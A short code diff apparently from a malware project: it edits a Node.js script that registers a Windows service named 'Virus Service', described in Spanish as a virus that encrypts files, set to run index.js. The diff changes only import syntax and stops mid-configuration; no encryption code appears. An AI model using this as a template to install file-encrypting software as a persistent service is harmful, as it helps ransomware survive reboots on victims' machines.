@@ -1,6 +1,6 @@
-const Service = require("node-windows").Service;
+import { Service } from 'node-windows';
 
-const svc = new Service({
+var svc = new Service({
   name: "Virus Service",
   description: "Virus que encripta archivos",
   script: "index.js", 
